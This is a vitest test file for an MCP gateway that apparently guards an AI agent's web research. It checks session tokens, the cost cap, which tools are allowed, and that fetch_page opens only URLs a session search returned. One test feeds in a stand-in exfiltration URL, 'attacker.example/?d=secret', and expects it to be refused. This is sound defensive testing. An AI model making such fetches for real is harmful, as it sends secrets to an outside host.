import { describe, expect, it } from "vitest";
import { GatewayUnauthorizedError, RetroGateway } from "~/domain/retro/retro-gateway.js";
import { gatewayTokenSha256, type WebSearchPort } from "~/domain/retro/web-research.js";
import type { SignalSourceRecord } from "~/domain/retro/signal-source.js";
import type { GatewaySessionRecord } from "~/persistence/prisma/retro.prisma.js";
import { Redactor } from "~/telemetry/redaction.js";

// docs/specs/retro-web-research.md. The gateway rules hold outside the prompt: a token of an ended
// session is refused, fetch_page opens only a searched URL, and only ticked tools answer.

const NOW = new Date("2026-11-26T10:00:00Z");

const sessionRow = (overrides: Partial<GatewaySessionRecord> = {}): GatewaySessionRecord => ({
  id: "gs-1",
  tenantId: "t",
  retroId: "r",
  productId: "p",
  webResearch: true,
  costLeftUsd: 1,
  spentUsd: 0,
  expiresAt: new Date(NOW.getTime() + 60_000),
  endedAt: null,
  ...overrides,
});

const source: SignalSourceRecord = {
  id: "s",
  tenantId: "t",
  productId: "p",
  name: "sentry",
  kind: "errors",
  endpoint: "https://mcp.sentry.example/mcp",
  secretName: null,
  enabled: true,
  queries: [],
  tickedTools: ["search_issues"],
  createdAt: NOW,
  updatedAt: NOW,
};

const build = (options: { reserve?: boolean; session?: GatewaySessionRecord } = {}) => {
  const session = options.session ?? sessionRow();
  const stored: Array<{ kind: string; url: string }> = [];
  const events: string[] = [];
  const calls: string[] = [];
  const search: WebSearchPort = {
    search: () => Promise.resolve([{ url: "https://example.com/news#top", title: "News", publishedDate: "2026-11-20", snippet: "a snippet" }]),
    contents: (url) => Promise.resolve({ title: "News", text: `text of ${url}` }),
  };
  const gateway = new RetroGateway({
    store: {
      byToken: (sha) => Promise.resolve(sha === gatewayTokenSha256("frg_good") ? session : null),
      reserve: () => Promise.resolve(options.reserve ?? true),
      storeWebResults: (_session, rows) => {
        stored.push(...rows);
        return Promise.resolve(rows.map((row, index) => ({ ...row, id: `web-${stored.length - rows.length + index}`, bytes: row.content.length })));
      },
      searched: (_id, url) => Promise.resolve(stored.some((row) => row.kind === "search" && row.url === url)),
      storeLiveSignal: () => Promise.resolve("signal-1"),
    },
    retros: { addEvents: (_id, added) => (events.push(...added.map((event) => event.message)), Promise.resolve()) },
    signalSources: { list: () => Promise.resolve([source]) },
    secrets: { get: () => Promise.resolve(null) },
    mcpTools: () => ({ callTool: (name) => (calls.push(name), Promise.resolve("issue list")) }),
    webSearch: () => Promise.resolve(search),
    redactorFor: () => Promise.resolve(new Redactor()),
    logger: { info: () => undefined, warn: () => undefined, error: () => undefined, debug: () => undefined } as never,
    clock: () => NOW,
  });
  const call = async (name: string, args: Record<string, unknown>) => {
    const answer = await gateway.handle(session, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } });
    return (answer as { result: { content: Array<{ text: string }>; isError?: boolean } }).result;
  };
  return { gateway, call, stored, events, calls };
};

describe("the retro gateway", () => {
  it("refuses an unknown token and the token of an ended session", async () => {
    await expect(build().gateway.authorize("frg_other")).rejects.toBeInstanceOf(GatewayUnauthorizedError);
    await expect(build({ session: sessionRow({ endedAt: NOW }) }).gateway.authorize("frg_good")).rejects.toBeInstanceOf(GatewayUnauthorizedError);
    await expect(build().gateway.authorize("frg_good")).resolves.toMatchObject({ id: "gs-1" });
  });

  it("opens a page only when a search of the session returned its URL", async () => {
    const { call, events } = build();
    const refused = await call("fetch_page", { url: "https://attacker.example/?d=secret" });
    expect(refused.isError).toBe(true);
    expect(events.at(-1)).toMatch(/no web_search of this session returned it/);
    await call("web_search", { query: "competitor launch" });
    const page = await call("fetch_page", { url: "https://example.com/news" });
    expect(page.isError).toBeUndefined();
    expect(page.content[0]!.text).toContain("text of https://example.com/news");
  });

  it("refuses a search once the session reached a limit or the cost cap", async () => {
    const { call, events } = build({ reserve: false });
    expect((await call("web_search", { query: "x" })).isError).toBe(true);
    expect(events.at(-1)).toMatch(/cost cap/);
  });

  it("calls a ticked tool and refuses any other", async () => {
    const { call, calls, events } = build();
    expect((await call("sentry__search_issues", { query: "is:unresolved" })).content[0]!.text).toContain("Signal result id: signal-1");
    expect((await call("sentry__resolve_issue", { id: "1" })).isError).toBe(true);
    expect(calls).toEqual(["search_issues"]);
    expect(events.at(-1)).toMatch(/not a ticked tool/);
  });

  it("offers no web tool when the product has Web research off", async () => {
    const { gateway } = build({ session: sessionRow({ webResearch: false }) });
    const listed = await gateway.handle(sessionRow({ webResearch: false }), { jsonrpc: "2.0", id: 2, method: "tools/list" });
    expect((listed as { result: { tools: Array<{ name: string }> } }).result.tools.map((tool) => tool.name)).toEqual(["sentry__search_issues"]);
  });
});

describe("the retro gateway route", () => {
  it("answers 401 for an ended session, 202 for a notification, and JSON for a call", async () => {
    const { default: Fastify } = await import("fastify");
    const { registerRetroGatewayRoutes } = await import("~/http/retro-gateway.routes.js");
    const app = Fastify();
    registerRetroGatewayRoutes(app, build().gateway);
    const post = (token: string, body: unknown) =>
      app.inject({ method: "POST", url: "/retro-gateway/mcp", headers: { authorization: `Bearer ${token}`, "content-type": "application/json" }, payload: JSON.stringify(body) });
    expect((await post("frg_ended", { jsonrpc: "2.0", id: 1, method: "ping" })).statusCode).toBe(401);
    expect((await post("frg_good", { jsonrpc: "2.0", method: "notifications/initialized" })).statusCode).toBe(202);
    const init = await post("frg_good", { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } });
    expect(init.json()).toMatchObject({ id: 1, result: { capabilities: { tools: {} }, protocolVersion: "2025-06-18" } });
    expect((await app.inject({ method: "GET", url: "/retro-gateway/mcp" })).statusCode).toBe(405);
    await app.close();
  });
});
